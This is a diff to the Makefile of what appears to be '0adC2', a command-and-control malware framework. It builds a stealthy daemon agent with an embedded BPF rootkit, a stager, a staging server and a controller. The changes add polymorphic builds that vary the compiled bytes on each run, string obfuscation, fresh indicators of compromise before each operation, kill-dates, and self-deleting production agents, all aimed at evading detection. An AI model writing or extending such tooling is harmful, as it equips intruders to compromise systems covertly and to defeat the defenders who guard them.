@@ -16,7 +16,9 @@ EXTRA_CFLAGS ?=
 CFLAGS = -Wall -Wextra -O2 -std=gnu11 -I$(SRC) -DBUILD_EXPIRE=$(BUILD_EXPIRE)UL -rdynamic $(EXTRA_CFLAGS)
 LIBS   = -lenet -lsodium -lm -ldl
 
-# Polymorphic build seeds — re-evaluated on every make poly* invocation
+# Polymorphic build seeds — fresh random values on every poly* invocation.
+# Passed to -frandom-seed and -falign-* to vary GCC's instruction scheduling
+# and alignment padding, producing different .text bytes each build.
 POLY_SEED  := $(shell python3 -c "import os; print(int.from_bytes(os.urandom(4),'little')&0x7FFFFFFF)")
 POLY_ALIGN := $(shell python3 -c "import os; print([4,8,16,32][os.urandom(1)[0]%4])")
 
@@ -45,6 +47,9 @@ $(SRC)/obf_strings.h: $(CFG)/obf_config.txt $(TOOLS)/gen_obf.py
 
 # ── Production agent (stripped, daemon, embedded BPF rootkit) ────────────────
 
+# Wildcard: poly_cfg.h and poly_stubs.h are optional (only present after make poly*).
+# $(wildcard ...) expands to an empty string when the files do not exist, so the
+# agent target still builds cleanly without polymorphic headers.
 POLY_DEPS := $(wildcard $(SRC)/poly_cfg.h $(SRC)/poly_stubs.h)
 
 agent: $(SRC)/agent.c $(SRC)/c2_proto.h $(SRC)/obf_agent_strings.h \
@@ -86,7 +91,7 @@ stager: $(SRC)/stager.c $(SRC)/obf_strings.h
 
 # ── Staging server ────────────────────────────────────────────────────────────
 
-stage_srv: $(SRC)/stage_srv.c
+stage_srv: $(SRC)/stage_srv.c $(SRC)/c2_proto.h
 	$(CC) $(CFLAGS) -o $@ $(SRC)/stage_srv.c -lsodium
 	strip --strip-all $@
 	@echo "[*] stage_srv compiled (stripped)"
@@ -226,25 +231,29 @@ help:
 	@echo "0adC2 — Makefile"
 	@echo ""
 	@echo "  Main targets:"
-	@echo "    make fresh_debug             Rebuild debug (agent_debug + ctrl)"
-	@echo "    make fresh                   Rebuild prod agent + ctrl (both stripped)"
-	@echo "    make fresh_all               Rebuild EVERYTHING + new IOCs (before operation)"
-	@echo "    make fresh_all EXPIRE_DAYS=N Same with kill-date in N days"
+	@echo "    make fresh_debug             Rebuild debug (agent_debug + ctrl), new IOCs"
+	@echo "    make fresh                   Rebuild prod agent + ctrl, new IOCs (both stripped)"
+	@echo "    make fresh_all               Rebuild everything + new IOCs (use before every op)"
+	@echo "    make fresh_all EXPIRE_DAYS=N Same + kill-date compiled into agent in N days"
+	@echo "    make fresh_all_debug         Rebuild everything + new IOCs, debug (unstripped)"
 	@echo "    make poly_debug              Polymorphic debug build (unique opcodes each run)"
 	@echo "    make poly_all                Polymorphic full build (unique opcodes each run)"
-	@echo "    make ci                      CI build without BPF (ctrl only)"
+	@echo "    make ci                      CI build without BPF (ctrl only, GitHub Actions)"
 	@echo ""
 	@echo "  Individual targets:"
+	@echo "    make all          alias for agent_debug + ctrl (quick dev build)"
 	@echo "    make agent        prod agent (stripped, daemon, embedded BPF rootkit)"
-	@echo "    make agent_debug  debug agent (foreground, no sandbox)"
-	@echo "    make ctrl         controller (readline, stripped)"
-	@echo "    make stager       stager (~14KB, new IOCs, stripped via -s)"
+	@echo "    make agent_debug  debug agent (foreground, no sandbox, no self-delete)"
+	@echo "    make agent_verbose agent with full protocol traces on stderr"
+	@echo "    make ctrl         controller (readline prompt, ECDH, stripped)"
+	@echo "    make stager       stager (~14KB, stripped; reuses existing IOCs unless absent)"
+	@echo "    make stager_fresh stager with forced IOC regeneration"
 	@echo "    make stage_srv    staging server (stripped)"
 	@echo ""
 	@echo "  Utilities:"
-	@echo "    make check_deps   check libsodium, libenet, clang..."
+	@echo "    make check_deps   check libsodium, libenet, clang, bpftool..."
 	@echo "    make hashes       SHA256 of current binaries"
 	@echo "    make show_players display player names from current build"
-	@echo "    make test_staging loopback test stager->stage_srv"
+	@echo "    make test_staging loopback staging chain test (stager -> stage_srv -> agent_debug)"
 	@echo "    make clean        remove binaries + generated headers"
 	@echo ""
